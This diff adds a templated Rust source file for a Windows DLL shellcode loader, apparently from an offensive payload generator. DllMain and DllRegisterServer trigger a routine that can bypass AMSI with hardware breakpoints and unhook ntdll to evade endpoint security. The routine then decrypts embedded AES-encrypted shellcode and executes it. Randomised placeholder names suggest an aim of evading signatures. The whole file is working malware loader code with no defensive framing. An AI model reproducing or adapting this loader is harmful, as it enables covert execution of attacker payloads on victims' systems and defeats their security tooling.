@@ -1,0 +1,39 @@
+extern crate scaffold;
+
+#[no_mangle]
+pub unsafe extern "system" fn DllMain(
+    _: *mut core::ffi::c_void,
+    reason: u32,
+    _: *mut core::ffi::c_void,
+) -> i32 {
+    if reason == 1 {
+        {{ v.fn_run }}();
+    }
+    1
+}
+
+#[no_mangle]
+pub unsafe extern "system" fn DllRegisterServer() { {{ v.fn_run }}(); }
+
+unsafe fn {{ v.fn_run }}() {
+    {%- if "AmsiHwbp" in feature_names %}
+    scaffold::bypass::amsi_hwbp::install_amsi_bypass();
+    {%- endif %}
+    {%- if "UnhookDisk" in feature_names %}
+    scaffold::evasion::unhook::unhook_ntdll_disk();
+    {%- endif %}
+
+    let {{ v.var_shellcode }}: &[u8] = &[
+        {%- for byte in config.shellcode_hex | hex_bytes %}{{ byte }},{% endfor %}
+    ];
+    let {{ v.var_key }}: [u8; 32] = [
+        {%- for byte in config.key_hex | hex_bytes %}{{ byte }},{% endfor %}
+    ];
+    let {{ v.var_iv }}: [u8; 16] = [
+        {%- for byte in config.iv_hex | hex_bytes %}{{ byte }},{% endfor %}
+    ];
+    let {{ v.var_ptr }} = scaffold::crypto::decrypt_aes256(
+        {{ v.var_shellcode }}, &{{ v.var_key }}, &{{ v.var_iv }}
+    ).unwrap();
+    scaffold::inject::exec::run_no_rwx(&{{ v.var_ptr }});
+}
